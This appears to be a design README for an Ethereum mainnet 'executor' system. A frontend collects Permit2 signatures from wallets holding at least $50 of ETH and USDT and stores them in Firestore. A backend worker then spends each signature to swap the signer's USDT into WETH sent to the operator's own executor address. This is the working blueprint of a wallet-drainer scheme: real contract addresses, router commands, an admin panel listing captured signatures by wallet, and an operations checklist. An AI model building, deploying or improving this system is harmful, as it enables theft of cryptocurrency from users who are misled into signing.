# Executor/Admin System Architecture

## Overview
The executor system is fully configured for **Mainnet** and works in sync with the frontend.

## How It Works

### 1. Frontend → Signature Generation (Mainnet)
```
User's Browser (Mainnet)
    ↓
Connects Wallet (MetaMask, WalletConnect, etc.)
    ↓
Checks Balance: ETH + USDT on mainnet
    ↓
Signs Permit2 Message
    ↓
Saves to Firestore: {
    owner: "0xUser...",
    token: "0xdAC17F958D2...", // Mainnet USDT
    amount: "10000000000",
    deadline: 1234567890,
    nonce: 0,
    r: "0x...",
    s: "0x...",
    v: 27,
    processed: false
}
```

### 2. Firestore → Database Storage
```
Firestore Collection: "permit2_signatures"
    │
    ├─ Document 1: { owner, token, amount, r, s, v, processed: false }
    ├─ Document 2: { ... }
    └─ Document 3: { ... }
```

### 3. Backend Worker → Monitoring (Mainnet)
```
Backend Worker Process (Node.js)
    ↓
1. Initialize:
   - Connect to Firestore
   - Load executor private key
    - Connect to Mainnet RPC: https://cloudflare-eth.com
    - Initialize Mainnet contracts:
     * Permit2: 0x000000000022D473030F116dDEE9F6B43aC78BA3
    * Universal Router: 0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B
    ↓
2. Poll Firestore (every few seconds):
   - Query: WHERE processed == false
   - Limit: 10 documents per batch
    ↓
3. Validate Each Signature:
   - Check required fields exist
   - Verify deadline not expired
   - Check executor has ETH for gas (min 0.001 ETH)
   - Check user's token balance
    ↓
4. Build Transaction:
   - Command 0x02: PERMIT2_PERMIT (validates signature)
   - Command 0x08: V3_SWAP_EXACT_IN (swap tokens)
    - Path: USDT → WETH (mainnet addresses)
   - Recipient: Executor address
    ↓
5. Execute on Mainnet:
   - Sign transaction with executor private key
    - Submit to mainnet
   - Wait for confirmation
    ↓
6. Update Firestore:
   - Set processed: true
   - Add txHash, timestamp
   - Log any errors
```

### 4. Admin Dashboard → Monitoring UI
```
Admin Panel (/admin)
    ↓
Displays:
├─ All Signatures (grouped by wallet)
├─ Executor Balance (Mainnet ETH)
├─ Token Balances (Mainnet tokens)
├─ Processing Status
└─ Manual Execute Button

Real-time Updates via Firestore Listeners
```

## Mainnet Configuration Details

### Frontend (User-facing)
- **Network**: Mainnet (Chain ID: 1)
- **Connects via**: Reown AppKit
- **USDT Address**: `0xdAC17F958D2ee523a2206206994597C13D831ec7`
- **Checks Balance**: ETH + USDT on mainnet
- **Minimum**: $50 USD equivalent

### Backend (Executor)
- **Network**: Mainnet (Chain ID: 1)
- **RPC URL**: `https://cloudflare-eth.com`
- **Universal Router**: `0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B`
- **Output Token (WETH)**: `0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2`
- **Executor Wallet**: Must have mainnet ETH for gas

## Security Model

### Executor Wallet
```
Executor Private Key (Stored in functions/.env)
    ↓
Controls Wallet: 0xYourExecutor...  (mainnet)
    ↓
Needs: Mainnet ETH for gas fees only
    ↓
Does NOT need: User's tokens
    ↓
Why? Permit2 allows executor to transfer on behalf of user
```

### Permission Flow
```
User Signs Permit2
    ↓
Gives permission to Executor address
    ↓
Executor can call Permit2.permitTransferFrom()
    ↓
Transfers user's tokens using valid signature
    ↓
No pre-approval needed!
```

## Getting Mainnet Funds

### For Users:
1. Get mainnet ETH from your preferred onramp or exchange
2. Get mainnet USDT from a DEX or exchange

### For Executor (Backend):
1. Fund mainnet ETH for gas
2. Need at least 0.001 ETH for gas
3. Recommend 0.1 ETH for multiple transactions

## Common Issues & Solutions

### Issue: "Insufficient Balance" on Frontend
- **Cause**: User wallet doesn't have $50 worth of ETH + USDT on mainnet
- **Solution**: Fund the wallet with mainnet ETH/USDT

### Issue: "Insufficient ETH in executor wallet"
- **Cause**: Executor wallet ran out of gas fees
- **Solution**: Send more mainnet ETH to executor address

### Issue: "Signature deadline expired"
- **Cause**: Too much time passed between signing and execution
- **Solution**: Signatures are valid for 30 days, re-sign if expired

### Issue: "Transaction failed on-chain"
- **Cause**: Various (gas price, nonce, contract revert)
- **Solution**: Check transaction hash on Etherscan

## Monitoring & Debugging

### Check Executor Status:
```bash
# In backend directory
cd functions

# Check if worker is running
ps aux | grep worker.js

# View logs
npm start
```

### Check Firestore:
- Go to Firebase Console
- Navigate to Firestore Database
- Check `permit2_signatures` collection
- Look for `processed: false` documents

### Check On-Chain (Mainnet):
- Etherscan: https://etherscan.io/
- Check executor address for transactions
- Verify token balances
- Check gas usage

## Production Checklist

Before deploying updates on mainnet:

- [ ] Verify executor wallet and keys are correct
- [ ] Confirm RPC and contract addresses
- [ ] Test with small amounts first
- [ ] Secure all private keys (use secrets manager)
- [ ] Fund executor with mainnet ETH
- [ ] Set up monitoring and alerts
- [ ] Test with small amounts first
- [ ] Have emergency stop mechanism ready
